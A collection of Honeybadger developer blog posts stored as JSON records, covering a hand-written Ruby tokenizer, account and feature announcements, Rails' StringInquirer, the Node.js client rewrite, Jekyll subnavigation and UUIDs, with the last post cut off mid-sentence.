{"website": "Honey-Badger", "title": "Replacing a Complex Regular Expression with a Simple Parser", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/replacing-regular-expressions-with-parsers/", "abstract": "Confession time: I don't particularly like working with regular expressions.  While I use them all the time, anything more complex than a /^foo.*$/ requires me to stop and think. While I'm sure there are people who can decipher expressions like \\A(?=\\w{6,10}\\z)(?=[^a-z]*[a-z])(?=(?:[^A-Z]*[A-Z]){3}) at a glance, but it takes me several minutes of googling and makes me unhappy. It's quite a difference from reading Ruby. If you're curious, the example above is taken from this article on regex lookaheads. The Situation At Honeybadger I'm currently working on improving our search UI. Like many search systems, ours uses a simple query language. Before my changes, if you wanted to search for a custom date range, you had to manually type in a query like so: occurred:[2017-06-12T16:10:00Z TO 2017-06-12T17:10:00Z] Ouch! In the new search UI, we want to detect when you start typing a date-related query and pop up a helpful datepicker. And of course, the datepicker is just the beginning. Eventually we'll expand the context-sensitive hinting to cover more kinds of search terms. Here are a few examples: assigned:jane@email.com context.user.id=100\nresolved:false ignored:false occurred:[\nparams.article.title:\"Starr's parser post\"       foo:'ba I need to tokenize these strings in such a way that: Whitespace separates tokens, except when surrounded by '', \"\" or [] Unquoted whitespace is its own token I can run tokens.join(\"\") to exactly recreate the input string For example: tokenize(%[params.article.title:\"Starr's parser post\"       foo:'ba])\n=> [\"params.article.title:\\\"Starr's parser post\\\"\", \"       \", \"foo:'ba\"] Using A Regular Expression My first thought was to use a capturing regular expression to define what a valid token should look like, then use String#split to split the string into tokens. It's a pretty cool trick, actually: # The parens in the regexp mean that the separator is added to the array \"foo  bar  baz\" . split ( /(foo|bar|baz)/ ) => [ \"\" , \"foo\" , \"  \" , \"bar\" , \"  \" , \"baz\" ] This looked promising initially, despite the weird empty-strings. But my real-world regular expression was much more complex. My first draft looked like this: /\n  (                          # Capture group is so split will include matching and non-matching strings\n    (?:                      # The first character of the key, which is\n      (?!\\s)[^:\\s\"'\\[]{1}    # ..any valid \"key\" char not preceeded by whitespace\n      |^[^:\\s\"'\\[]{0,1}      # ..or any valid \"key\" char at beginning of line\n    )\n    [^:\\s\"'\\[]*              # The rest of the \"key\" chars\n    :                        # a colon\n    (?:                      # The \"value\" chars, which are\n      '[^']+'                # ..anything surrounded by single quotes\n      | \"[^\"]+\"              # ..or anything surrounded by double quotes\n      | \\[\\S+\\sTO\\s\\S+\\]     # ..or anything like [x TO y]\n      | [^\\s\"'\\[]+           # ..or any string not containing whitespace or special chars\n    )\n  )\n/xi Working with this gave me a sinking feeling. Every time I found an edge case I'd have to amend the regular expression, making it even more complex. In addition, it needed to work in JavaScript as well as Ruby, so certain features like negative lookbehind weren't available. ...It was about this time that the absurdity of all this struck me. The regular expression approach I was using was much more complicated than it would be to write a simple parser from scratch. Anatomy of a Parser I'm no expert, but simple parsers are simple. All they do is: Step through a string, character by character Append each character to a buffer When a token-separating condition is encountered, save the buffer to an array and empty it. Knowing this, we can set up a simple parser that splits strings by whitespace. It's roughly the equivalent to \"foo bar\".split(/(\\s+)/) . class Parser WHITESPACE = /\\s/ NON_WHITESPACE = /\\S/ def initialize @buffer = [] @output = [] end def parse ( text ) text . each_char do | c | case c when WHITESPACE flush if previous . match ( NON_WHITESPACE ) @buffer << c else flush if previous . match ( WHITESPACE ) @buffer << c end end flush @output end protected def flush if @buffer . any? @output << @buffer . join ( \"\" ) @buffer = [] end end def previous @buffer . last || \"\" end end puts Parser . new (). parse ( \"foo bar baz\" ). inspect # Outputs [\"foo\", \" \", \"bar\", \" \", \"baz\"] This is a step in the direction of what I want, but it's missing support for quotes and brackets. Fortunately, adding that only takes a few lines of code: def parse ( text ) surround = nil text . each_char do | c | case c when WHITESPACE flush if previous . match ( NON_WHITESPACE ) && ! surround @buffer << c when '\"' , \"'\" @buffer << c if ! surround surround = c elsif surround == c flush surround = nil end when \"[\" @buffer << c surround = c if ! surround when \"]\" @buffer << c if surround == \"[\" flush surround = nil end else flush () if previous (). match ( WHITESPACE ) && ! surround @buffer << c end end flush @output end This code is only a bit longer than my regular-expression-based approach but is much much more straightforward. Parting thoughts There's probably a regular expression out there that would work fine with my use case. If history is any guide, It's probably simple enough to make me look like a fool. :) But I really enjoyed the chance to write this little parser. It broke me out of the rut I was in with the regex approach. As a nice bonus, I'm a lot more confident in the resulting code than I ever am with code that is based around complicated regular expressions.", "date": "2017-06-27"},
{"website": "Honey-Badger", "title": "A big change: Accounts", "author": ["Benjamin Curtis"], "link": "https://www.honeybadger.io/blog/announcing-account-changes/", "abstract": "I'm delighted to announce a change to Honeybadger that I've wanted to have for several years: Accounts. Now, it might be a head-scratcher for you that I would be excited about accounts, but it's true — I'm excited about launching a feature that is one of the more basic parts of a typical SaaS app. Just in case you're thinking, \"but you already have accounts — I'm logged in to mine right now!\", then let me digress a bit. Yes, we already had what you can call a user account... the thing you log in to with your email address and password. This new thing that I'm calling accounts, though, is at an organizational level above users, or, in other words, a way to group of set of users together. In Ruby on Rails' terms, an Account has many Users. So, if you were just starting with Honeybadger as, say, a small software company, you'd create an account for your company and your co-workers would join that company account, each with their own individual login. Some backstory Ok, back from the digression: To provide some insight as to why this is a big deal for me, we need to go back to the earliest days of Honeybadger... In 2012, when we originally launched Honeybadger, Starr, Josh, and I envisioned that most of our customers would be freelancers, moving from client to client and from project to project on a regular basis. As they moved between clients and projects, they'd invite other developers to their projects, and then those developers would become paying customers as they took over projects, etc. For that scenario, we thought it made sense for every user to be considered a potential subscriber, even if they got started with Honeybadger as a free collaborator for an existing subscriber. That approach actually worked well for us in the early days, as we did see that kind of referral-based growth happen quite a bit. However, it also eventually became apparent that it made more sense to separate the subscription from the user, and instead associate the subscription with an account (or organization, if you prefer the GitHub nomenclature). By the time we had that realization, though, it was also clear that making that change would be fairly disruptive (from a code and database point of view), so we decided to put it off. :) Time and again we'd come back to it, and time and again we'd decide we weren't ready to spend the time needed to make that change. And that's how it remained, until this year, when I finally decided that we shouldn't put it off any longer. I mean, what better year to change the deepest parts of the billing and authentication system for your app, than 2020, right? ;) So that's how we got to where we are — now let's look at what this change means to you. What's changing? Instead of associating the billing information and project ownership with a particular user, we will now connect that stuff to an account, which is managed by users. This will clear up a lot of confusion we've caused by having each user having their own subscription information, even if they were just a collaborator on someone else's subscription. Account owners and admins will be able to do all account administration, including updating billing information and making changes to users, projects, and teams. Also, when the person who set up the Honeybadger account leaves your company, you no longer have to make a support request to get the account transferred — simply make another account user an owner, and you can handle the change yourself. Since this mostly an administrative thing, the impacts on your day-to-day usage of the app are relatively minor. You can still jump directly to an error from a Slack message or an email, get the critical info about an error in one glance, and so on. However, you will see some changes in the UI. The first thing you'll likely notice is that we now show your name and the account you are currently viewing in the navigation bar. This will help you know what your context in the app is, as we now limit the project list (the default view) to only those projects that belong to the account you're currently viewing. If you want to view projects from another account, you'll need to use the new account switcher in the drop-down navigation. We're hoping this separation of projects will be especially useful for agency employees or freelancers who are working in projects for multiple clients, or for those users who have some personal projects separate from their work projects. Speaking of which, our goal is still to make Honeybadger easy to spread, like in the early days. We still get a lot of our growth from our current customers referring new customers to us, for which we're very grateful! We think the new account approach is great for this... if you're a freelancer or an agency wanting to onboard a new client, or if you're using Honeybadger for work and want to have your own private projects, you can easily create a new account via the account switcher and quickly get to work in a new context. You don't even have to pick a plan right away — we will default the new account to our generous Basic plan, which is completely free. We've also moved some settings from the User Settings page, like the SAML configuration, to the Account Settings page. Settings that still apply to a single user, like personal GitHub account connections, will remain on the User Settings page. Other than those minor things, not much of the UI has changed. A shout-out to our Heroku addon customers If you use Honeybadger as a Heroku addon, you'll notice some more significant changes. First, you'll be able to switch back and forth between Honeybadger accounts provisioned by Heroku using the same account switcher, once you've logged in to that Honeybadger account from Heroku SSO (either via the Heroku dashboard or via the CLI: heroku addons:open honeybadger ). And logging in via SSO will create your own personal notification channels (Email, SMS, and in-browser notifications) separate from everyone else on the Heroku team, just like with Honeybadger accounts created at our site. When you switch to a Honeybadger account that was provisioned by Heroku, you'll be bounced to Heroku SSO before switching to the account, to ensure you still have access to the addon. We have further changes to come for users of our Heroku, now that we have this major change in place. On that note, this switch unblocks some other changes we've been wanting to make to the app for some time, so stay tuned for more exciting news in 2021! Until then, if you have any suggestions about what we can change to make Honeybadger even more awesome for you, please get in touch .", "date": "2020-12-02"},
{"website": "Honey-Badger", "title": "Shipping in 2017: Feature Roundup", "author": ["Josh Wood"], "link": "https://www.honeybadger.io/blog/2017-feature-roundup/", "abstract": "As a lean bootstrapped startup , there's always a lot to do at Honeybadger, in addition to shipping features. \"Business things\" constantly plot to distract us from our first love: shipping new features. Luckily for our customers, we're developers: we're great at procrastinating on the boring business stuff so that we can code all day. :) The year is not over yet (so expect this post to get an update from time to time!), but we wanted to share some of the features we've shipped this year. The list is in reverse-chronological order, so you can see what we've been up to most recently and read on to learn about all the other cool things we've done this year. Ship it! :shipit: August 2017: Check-Ins! In August, we released a brand new monitoring feature called Check-Ins. Check-Ins allows you to monitor jobs and services by pinging a Honeybadger URL periodically. If you ever stop \"checking in\", Honeybadger will alert you. You can use Check-Ins to keep an eye on your cron jobs, scheduled tasks, or anything that you want to ensure is running properly: Read the blog post and check out the docs to learn more. July 2017: Source Map Uploads Honeybadger has supported source maps for several years now, but admitedly not very well. We had some limitations: you had to make your source maps public for us to be able to download them, and we didn’t use the source map when grouping errors. In July we shipped the next version of our source maps feature which solves both of those issues (and more)! Check out the blog post and the docs . June 2017: Search Improvements In June we released the foundation for a new search UI which will allow us to expose our powerful search syntax in an intuitive graphical interface. The first feature we built into the new UI is a date picker, which you can read about on the blog : We’re currently testing a bunch of similar new UI additions which should be released later this year. May 2017: Unsubscribe from Specific Notifications May was a busy travel month for us, but we still managed to get two new features out the door: You can now unsubscribe from notifications for individual errors. When you use the Unsubscribe button on the error detail page or reply to a notification email with @unsubscribe, you will no longer receive notifications about that error via email or SMS. We also updated the The Asana integration to use OAuth for authentication instead of API keys. You can update your integrations by editing the integration and clicking the \"Save and Authenticate\" button. You can also connect your Asana account to your Honeybadger account (to create tasks manually from the Honeybadger UI) by visiting https://app.honeybadger.io/users/edit#authentication and clicking the \"Connect Asana\" button. April 2017: Uptime 2.0 Uptime monitoring got an upgrade in April, with a bunch of new options for monitoring HTTP endpoints. You can now do the following for your checks: Specify custom request headers Specify a request body Choose the request method (GET, PUT, POST, PATCH, DELETE) Choose the test frequency (1, 5, 15 minute intervals) Choose the test locations Choose whether to trigger an outage for an expired, invalid, or self-signed SSL certificate We also added a report of the uptime percentage by month when viewing the details for a site. Oh, and one other thing: we made comments editable! March 2017: Error Tracking Improvements In March we made various improvements to error tracking, including: The sort order is now displayed more prominently in the error index page We added callouts on the error details page to let you know when you're viewing the first or most-recent error occurrence We released v3.1.0 of the Ruby gem as a followup to the 3.0.0 release We added a quick way to copy the params and other data to the clipboard on the error detail page February 2017: Ruby Gem 3.0 and more In February we released version 3.0.0 of our Ruby gem. The new version brought a lot of improvements: “Plain Ruby Mode”, which allows the Honeybadger client to be used without any of our optional integrations (for those of us who dislike magic) Support for reporting to multiple Honeybadger projects in the same app We brought back Honeybadger.configure to optionally configure the gem from Ruby Cron and bash error reporting using honeybadger exec Command-line error reporting using honeybadger notify To learn more about the new gem, read the blog post and check out a full list of changes in the CHANGELOG . We also added a new integration with Clubhouse . Clubhouse users can now create a new story from an error in Honeybadger. We can also automaticaly create stories when an error occurs and mark them as fixed when the error is resolved. Finally, you can now filter out errors that have been paused from your search results using -is:paused in your search string. You can also find only the errors that have been paused by using is:paused . January 2017: Platform Improvements The end of 2016 was hectic for us, with RubyConf capping our conference travel followed immediately by the holidays. January was a month to decompress, and to work on a bunch of improvements to the Honeybadger platform: We moved more of our infrastructure to AWS Added a new authentication option for Uptime monitoring and WebHooks Beta tested a new major version of our Ruby gem Fixed some bugs in the Rails app", "date": "2017-08-10"},
{"website": "Honey-Badger", "title": "Rails' Hidden Gems: ActiveSupport StringInquirer", "author": ["Jonathan Miles"], "link": "https://www.honeybadger.io/blog/rails-activesupport-stringinquirer/", "abstract": "Rails is a large framework, and it grows larger every year. This makes it easy for some helpful features to slip by unnoticed. In this series, we'll take a look at some lesser-known functionality built into Rails for specific tasks. In the first article in this series, we're going to take a look at how calling Rails.env.test? actually works under-the-hood by using the little-known StringInquirer class from ActiveSupport. Going one step further, we will also walk through the StringInquirer source code to see how it works, which (spoiler alert) is a simple example of Ruby's metaprogramming via the special method_missing method. The Rails.env helper You've probably already seen code that checks the Rails environment: if Rails . env . test? # return hard-coded value... else # contact external API... end However, what does test? actually do, and where does this method come from? If we check Rails.env in a console, it acts like a string: => Rails . env \"development\" The string here is whatever the RAILS*ENV environment variable is set to; it's not _just* a String, though. When reading the class in the console, we see: => Rails . env . class ActiveSupport :: StringInquirer Rails.env is actually a StringInquirer. StringInquirer The code for StringInquirer is both brief and well documented. How it works, though, may not be obvious unless you are familiar with Ruby's metaprogramming capabilities. We'll walk through what's happening here. class StringInquirer < String ... end First, we see that StringInquirer is a subclass of String. This is why Rails.env acts like a String when we call it. By inheriting from String, we automatically get all the String-like functionality, so we can treat it like a String. Rails.env.upcase works, as does ActiveRecordModel.find_by(string_column: Rails.env) . While Rails.env is a handy, built-in example of StringInquirer, we are also free to create our own: def type result = \"old\" result = \"new\" if @new ActiveSupport :: StringInquirer . new ( result ) end Then, we get the question-mark methods on the returned value: => @new = false => type . old? true => type . new? false => type . testvalue? false => @new = true => type . new? true => type . old? false method_missing method_missing is the real secret sauce here. In Ruby, whenever we call a method on an object, Ruby begins by looking at all the ancestors of the object (i.e., base classes or included modules) for the method. If one is not found, Ruby will call method_missing , passing in the name of the method it is looking for, along with any arguments. By default, this method just raises an exception. We're all probably familiar with the NoMethodError: undefined method 'test' for nil:NilClass type of error message. We can implement our own method_missing that does not raise an exception, which is exactly what StringInquirer does: def method_missing ( method_name , * arguments ) if method_name . end_with? ( \"?\" ) self == method_name [ 0 ..- 2 ] else super end end For any method name that ends in ? , we check the value of self (i.e., the String) against the method name without the ? . Put another way, if we call StringInquirer.new(\"test\").long_test_method_name? , the returned value is \"test\" == \"long_test_method_name\" . If the method name does not end with a question mark, we fall back to the original method_missing (the one that will raise an exception). respond_to_missing? There's one more method in the file: respond_to_missing? . We might say that this is a companion method to method_missing . Although method_missing gives us the functionality, we also need a way to tell Ruby that we accept these question-mark-ending methods. def respond_to_missing? ( method_name , include_private = false ) method_name . end_with? ( \"?\" ) || super end This comes into play if we call respond_to? on this object. Without this, if we called StringInquirer.new(\"test\").respond_to?(:test?) , the result would be false because we have no explicit method called test? . This is obviously misleading because I would expect it to return true if I call Rails.env.respond_to?(:test?) . respond_to_missing? is what allows us to say \"yes, I can handle that method\" to Ruby. If the method name does not end in a question mark, we fall back to the superclass method. Practical use cases Now that we know how StringInquirer works, let's take a look at instances where it could be useful: 1. Environment variables Environment variables meet two criteria that make them great choices for StringInquirer. First, they often have a limited, known set of possible values (like an enum ), and second, we often have conditional logic that depends on their value. Let's say our app is hooked up to a payment API, and we have the credentials stored in environment variables. In our production system, this is obviously the real API, but in our staging or development version, we want to use their sandbox API: # ENV[\"PAYMENT_API_MODE\"] = sandbox/production class PaymentGateway def api_mode # We use ENV.fetch because we want to raise if the value is missing @api_mode ||= ENV . fetch ( \"PAYMENT_API_MODE\" ). inquiry end def api_url # Pro-tip: We *only* use production if MODE == 'production', and default # to sandbox if the value is anything else, this prevents us using production # values if the value is mistyped or incorrect if api_mode . production? PRODUCTION_URL else SANDBOX_URL end end end Note that in the above, we are using ActiveSupport's String#inquiry method, which handily converts a String into a StringInquirer for us. 2. API responses Continuing our payment API example from above, the API will send us a response that includes some success/failure state. Again, this meets the two criteria that make it a candidate for StringInquirer: a limited set of possible values and conditional logic that will test these values. class PaymentGateway def create_charge response = JSON . parse ( api_call ( ... )) result = response [ \"result\" ]. inquiry if result . success? ... else ... end # result still acts like a string Rails . logger . info ( \"Payment result was: #{ result } \" ) end end Conclusion StringInquirer is an interesting tool to have in your back pocket, but personally, I wouldn't reach for it too often. It has some uses, but most of the time, an explicit method on an object gives you the same result. An explicitly named method also has a couple of benefits; if the value ever needs to change, you only have to update a single place, and it makes the codebase easier to search if a developer is trying to locate the method. Although it focuses on StringInquirer, this article is intended to be more of a gentle introduction to some of Ruby's metaprogramming capabilities using method_missing . I would say that you probably don't want to use method_missing in your application. However, it is often used in frameworks, such as Rails or domain-specific-languages provided by gems, so it can be very helpful to know \"how the sausage is made\" when you encounter issues.", "date": "2021-04-19"},
{"website": "Honey-Badger", "title": "Honeybadger is hiring a software developer", "author": ["Benjamin Curtis"], "link": "https://www.honeybadger.io/blog/hiring-a-software-developer/", "abstract": "For only the second time in the 7+ years we've been running Honeybadger, we have an opening for a software developer position. This individual will have ownership of our open source libraries, and will participate in significant projects in our main Rails app and in other apps we are bringing to market this year. We hope that candidates of all backgrounds will apply... though we are a pretty homogenous team at the moment, we'd like that to change. :) Our goal as a company is to always be learning and growing, and we feel we can best do that when we have a variety of experiences and viewpoints from which to draw. This is a full-time position available to remote candidates in time zones ranging from UTC-11 to UTC+2. The salary for this position is $104,580 / year. What we need We're looking for a developer who is happy to work with a variety of programming languages and frameworks, and who has some familiarity with web development frameworks and platforms such as Ruby/Rails, JavaScript/Node.js/React, PHP/Laravel, Elixir/Phoenix, etc. We're more interested in candidates who have a desire to learn new things and be a generalist than those that want to stick with just one technology. That said, our current stack is a monolithic Rails app backed (primarily) by PostgreSQL, running in AWS on Linux, with a fair of number of AWS services (like Lambda and DynamoDB) also in the mix. Strong communication skills are required for this position, for a few reasons: We're a 100% remote company, and we prefer asynchronous communication, so you'll be communicating mostly via your keyboard We work very independently, so the rest of us won't know what you're doing day-to-day unless you tell us You'll be interacting with our customers on a regular basis, handling inbound support and feature requests (every developer helps with support at Honeybadger, including the founders) You'll be writing documentation for the projects you deliver, both for internal and external consumption What we offer As developers, the three founders have tried to build a work environment that other developers would love. We work 30-hour weeks, we don't expect your butt to be in the seat for X amount of time or at certain times of the day (we ❤️ being async), and we encourage you to use your preferred tools and to pick the environment (home-office, coworking space, coffee shop, whatever) that works best for you. We maintain a very laid-back environment (no public roadmaps, no artificial deadlines, awesome and friendly customers), and we strongly encourage continued learning, experimentation, and even side projects. :) For more info on how we live and work at Honeybadger, check out Josh's blog post . For candidates located in the U.S., we offer 100% paid heath insurance for you and your dependents, a 401k with a 4% match, 4 weeks of paid parental leave, an unlimited vacation policy, and a corporate credit card. Updated Feburary 21st, 2020: We are no longer accepting applications for this position.", "date": "2020-02-04"},
{"website": "Honey-Badger", "title": "Honeybadger for Node.js is now awesome", "author": ["Josh Wood"], "link": "https://www.honeybadger.io/blog/honeybadger-for-node-js-is-now-awesome/", "abstract": "TLDR: We rewrote our npm package, and now it's awesome. Check out the code on GitHub Node.js was one of the very first languages supported by Honeybadger after Ruby and Client-Side JavaScript . At the time, one of our customers had written a simple npm package which we ended up officially adopting and maintaining. That package served us well for several years, but lately we've been wishing it could do more. A lot more. Things like reporting errors from AWS Lambda , or plugging into frameworks like Connect and Express . Reporting errors in asynchronous callbacks was a must, too, and automatically reporting uncaught errors when your processes crash. So, we wrote a completely new package for Node; one which does all of those things we wished for, and has an API similar to our clients for other languages. At the same time, it's distinctly JavaScript. Where our Ruby library follows a more object-oriented approach, we went a little more functional in style for Node. The code is concise, modular, and tries to make few assumptions about how you want to use it. While we do automatically hook into Node's global uncaughtException event, the other integrations are provided as optional middleware. And of course, if you just want to report errors manually, it's as easy as Honeybadger.notify(error) . So what's changed? In short, everything. But luckily, if you're using the older version of our npm package (< 1.0.0), upgrading should be pretty straightforward. Basically, instead of this (0.x syntax): var Honeybadger = require ( ' honeybadger ' ); var hb = new Honeybadger ({ apiKey : ' [ YOUR API KEY HERE ] ' , }); hb . send ( err ); Do this (1.0 syntax): var hb = require ( ' honeybadger ' ). configure ({ apiKey : ' [ YOUR API KEY HERE ] ' }); hb . notify ( err ); The new Honeybadger.notify() function should take all the same arguments as the old one, but is now even more powerful due to extra arguments and callbacks (more on that later). If you were initializing multiple clients before, see the new Honeybadger.factory() function which returns a completely new Honeybadger object which can be configured separately from the global singleton. The rest of this post will focus on some of the new features we've built into honeybadger v1.0. Connect and Express middleware Errors which happen in Express or Connect apps can be automatically reported to Honeybadger by installing our new middleware: app . use ( Honeybadger . requestHandler ); // Use *before* all other app middleware. // app.use(myMiddleware); app . use ( Honeybadger . errorHandler ); // Use *after* all other app middleware. // app.use(myErrorMiddleware); We've also created a sample of reporting errors from Express which you can deploy to Heroku with a single click: Reporting errors from AWS Lambda Honeybadger can also automatically report errors which happen in AWS Lambda functions, which is something we recently blogged about . We're super excited to bring this feature to Honeybadger for Node! It's as simple as: // Your handler function. function handler ( event , context ) { console . log ( ' Event: ' , event ); console . log ( ' Context: ' , context ); throw ( new Error ( ' Something went wrong. ' )); console . log ( \" Shouldn't make it here. \" ); } // Build and export the function. exports . handler = Honeybadger . lambdaHandler ( handler ); Take a look at our example of reporting errors from AWS Lambda to learn how to deploy your function with Honeybadger. Uncaught exception handler By default Honeybadger will now report all unhandled errors which crash your node processes. Here's an example: // crash.js var Honeybadger = require ( ' ./lib/honeybadger ' ). configure ({ apiKey : ' YOUR API KEY HERE ' }); Honeybadger . logger . level = ' info ' ; throw ( new Error ( ' Uncaught error, exiting. ' )); ...results in: $ node crash.js\nPOST to honeybadger successful { id : '11e63938-8e7f-48df-8b23-b8390c299e43' } Error: Uncaught error, exiting.\n    at Object.<anonymous> ( /Users/josh/code/honeybadger-node/test.js:7:7 ) at Module._compile ( module.js:413:34 ) at Object.Module._extensions..js ( module.js:422:10 ) at Module.load ( module.js:357:32 ) at Function.Module._load ( module.js:314:12 ) at Function.Module.runMain ( module.js:447:10 ) at startup ( node.js:146:18 ) at node.js:404:3 New Honeybadger.notify() callback Honeybadger.notify() now accepts more arguments than before, including an optional callback function as the last argument: Honeybadger . notify ( err , function notifyCallback ( err , notice ) { if ( err ) { return console . error ( err ); } // If there was no error, log the notice: console . log ( notice ); // { id: 'uuid' } }); This allows you to do things with the UUID of the error returned by our server after an error is reported. The UUID can be used to find the error in the Honeybadger app, or (eventually) associate user feedback with the error in Honeybadger. For more examples of using Honeybadger.notify() , check out the documentation . At Honeybadger we ♥ Node Those were just a few of our favorite features of the new Honeybadger for Node. Be sure to check out even more of the new stuff we've added: The ability to filter sensitive data A configurable logger Monitoring for errors in functions Sending extra context data with errors Event emitter We're excited to bring even more awesome features to Node in the future. Next up we want to add the ability to notify Honeybadger when you deploy your Node app natively from the honeybadger package. Feedback is welcome! Have a comment, question, suggestion, or bug report? Email me , submit an issue , or send a pull request . Need a Honeybadger account? Start your free trial and exterminate your Node errors today!", "date": "2016-04-21"},
{"website": "Honey-Badger", "title": "Multiple Levels of Subnavigation with Jekyll", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/multiple-levels-of-subnavigation-with-jekyll/", "abstract": "In a previous post I showed you how to generate subnavigation links for each H2 in a Jekyll page. In this post, we'll build on that foundation and show you how you can add arbitrary levels of subnavigation based on H3, H4, etc. Overview I've broken this project down into a couple of steps: First, we will use nokogiri to pull out the  sections defined by H3 tags \"inside\" of H2 tags Next, we'll use a cool trick to render arbitrary levels of sub navigation. We're going make a recursive template. Before we get started, let's make something clear. When I refer to an H3 tag as being inside of an H2, I don't mean that it's literally nested. Instead, I'm referring to the situation that we see below: <h2> Animals </h2> <p> Here are some kinds of animals. </p> <h3> Giraffe </h3> <p> This section about giraffes logically belongs inside of the section about animals, even though the structure of the Dom doesn't define it as being nested </p> <h3> Zebra </h3> <p> Another section that logically belongs under \"Animals\" </p> Breaking the Document into Sections The obvious problem that we face when breaking an HTML document like the one above into sections, is that nothing is nested. Most of the tools for parsing HTML are built to work with nesting. This isn't a deal breaker, but it does mean that we have to do a little bit more work. In the example below we find each H2 tag and then manually scan siblings for H3 tags. I did get fancy and use a custom enumerator. If you have any questions about those, check out my blog post on them . require \"nokogiri\" class MySubnavGenerator < Jekyll :: Generator def generate ( site ) parser = Jekyll :: Converters :: Markdown . new ( site . config ) site . pages . each do | page | if page . ext == \".md\" doc = Nokogiri :: HTML ( parser . convert ( page [ 'content' ])) page . data [ \"subnav\" ] = doc . css ( 'h2' ). map do | h2 | to_nav_item ( page , h2 ). tap do | item | item [ \"children\" ] = subheadings ( h2 ). map { | h3 | to_nav_item ( page , h3 ) } end end end end end # Converts a heading into a hash of the info for a link def to_nav_item ( page , heading ) { \"title\" => heading . text , \"url\" => [ page . url , heading [ 'id' ]]. join ( \"#\" ) } end # Returns an enumerator of all H3s \"belonging\" to an H2 def subheadings ( el ) Enumerator . new do | y | next_el = el . next_sibling while next_el && next_el . name != \"h2\" if next_el . name == \"h3\" y << next_el end next_el = next_el . next_sibling end end end end I realize that this is quite a blob of code to throw at you, but it builds off of the work we did in a previous post . If you have any questions about the structure of Jekyll plug-ins, or the way we're using nokogiri please check that article. When I run this code against our documentation site, I get a hash that looks something like this: [{ \"title\" => \"Getting Started\" , \"url\" => \"/lib/java.html#getting-started\" , \"sub_subnav\" => [{ \"title\" => \"Download / Maven\" , \"url\" => \"/lib/java.html#download-maven\" }, { \"title\" => \"Stand Alone Usage\" , \"url\" => \"/lib/java.html#stand-alone-usage\" }, { \"title\" => \"Servlet Usage\" , \"url\" => \"/lib/java.html#servlet-usage\" }, { \"title\" => \"Play Usage\" , \"url\" => \"/lib/java.html#play-usage\" }, { \"title\" => \"API Usage\" , \"url\" => \"/lib/java.html#api-usage\" }]}, ... Now all that we have to do is figure out how to render this thing using liquid templates. Rendering the Subnav It's actually not that difficult to render an arbitrarily deep sub navigation using liquid templates. The trick is to use a partial that renders itself. In my layout, I render the partial and pass in the collection of navigation items. {% include navigation_item.html collection=page.subnav level=0 %} The partial creates the links for this level of navigation, and then renders itself, passing in a list of children. Just like a recursive function, this can theoretically go on forever. Just for kicks, I've added a bit of code to give each level of the subnav a class like level-1 or level-2 . This is really useful for styling. {% if include.collection.size > 0 %} <ul class= \"nav nav-list level-{{ include.level }}\" > {% for item in include.collection %}\n      {% if item.url == page.url %} <li class= \"active\" > {% else %} <li> {% endif %}\n        {% if item.subnav.size > 0 %} <a class= \"has-subnav\" href= \"{{ item.url }}\" > <span class= \"glyphicon glyphicon-plus\" ></span> <span class= \"glyphicon glyphicon-minus\" ></span> {% else %} <a href= \"{{ item.url }}\" > {% endif %}\n          {{ item.title }} </a> {% assign next_level = include.level | plus: 1 %}\n        {% include navigation_item.html collection=item.children level=next_level %} </li> {% endfor %} </ul> {% endif %} That's it! This concludes our brief foray into the wonderful world of Jekyll. In the next few days of the publishing a series of articles on Ruby internals, so stay tuned!", "date": "2015-10-13"},
{"website": "Honey-Badger", "title": "Going deep on UUIDs and ULIDs", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/uuids-and-ulids/", "abstract": "The other day the HB team was chatting and Ben, our dev-ops master, mentioned that he wished he'd used ULIDs instead of UUIDs for a particular system. Like any seasoned engineer, my reaction was to mumble something non-committal then sneak over to Google to try to figure out what the hell a ULID is. Two hours later I emerged with a thousand-yard stare and the realization that the world of unique identifiers is larger and more wondrous than I ever could have imagined. Before we get started with ULIDs, let's go back to the basics and discuss what UUIDs are: What's the problem with \"regular\" ids? Most web applications that use databases default to numeric ids that increment automatically. For example, in Rails you might see behavior like this: p1 = Person . create! p1 . id # => 1 p2 = Person . create! p2 . id # => 2 The database can generate sequential ids because it stores a counter that increments on record creation. This pattern can also be seen outside of databases. Sometimes we need to assign ids manually, and we might store a custom counter in - say - a Redis instance. Sequential ids are easy to implement for low-volume use-cases, but they become more problematic as volume increases: It's impossible to create records concurrently because each insert has to wait in line to receive its id. Requesting a sequential id may require a network round trip and result in slower performance. It's difficult to scale out data stores that provide sequential ids. You have to worry about counters on different servers getting out of sync. It's easy for the node with the counter to become a single point of failure. Sequential ids also leak data, which may be a problem in some cases: You can easily guess the ids of resources that may not belong to you. If you create a user and its id is 20, you know that the service has 20 users. UUIDs are web-scale UUIDs look a little different than sequential ids. They are 128-bit numbers, typically expressed as 32 hexadecimal digits: 123e4567-e89b-12d3-a456-426655440000 UUIDs are created using specific algorithms defined in RFC 4122 . They attempt to solve many of the problems that occur with sequential ids: You can generate UUIDs on any number of nodes without any shared state or coordination between nodes. They're a little less guessable than sequential ids (more on that later) They don't divulge the size of your dataset. The catch is that there's a small chance of two nodes independently generating the same id. This event is called a \"collision.\" Many Flavors of UUID There are five types of UUID algorithm defined in RFC 4122 . They fall into two categories: Time and randomness-based algorithms are the ones we've been discussing. They result in a new UUID for every run. Type 4 : A randomly-generated id. Probably our best bet for new code. Type 1 : The ID contains the host's MAC address and the current timestamp. These are deprecated because they're too easy to guess. Type 2 : These seem to be uncommon. They appear to be purpose-built for an antiquated form of RPC. Name based algorithms are a little different. They always produce the same UUID for a given set of inputs. Type 5 : Uses an SHA-1 hash to generate the UUID. Recommended. Type 3 : Uses an MD5 hash and is deprecated because MD5 is too insecure. In Ruby, you can generate UUIDs via the uuidtools gem. It supports every type, except the mysterious type 2; # Code stolen from the uuidtools readme. :) require \"uuidtools\" # Type 1 UUIDTools :: UUID . timestamp_create # => #<UUID:0x2adfdc UUID:64a5189c-25b3-11da-a97b-00c04fd430c8> # Type 4 UUIDTools :: UUID . random_create # => #<UUID:0x19013a UUID:984265dc-4200-4f02-ae70-fe4f48964159> # Type 3 UUIDTools :: UUID . md5_create ( UUIDTools :: UUID_DNS_NAMESPACE , \"www.widgets.com\" ) # => #<UUID:0x287576 UUID:3d813cbb-47fb-32ba-91df-831e1593ac29> # Type 5 UUIDTools :: UUID . sha1_create ( UUIDTools :: UUID_DNS_NAMESPACE , \"www.widgets.com\" ) # => #<UUID:0x2a0116 UUID:21f7f8de-8051-5b89-8680-0195ef798b6a> Moving on to ULIDs Note: 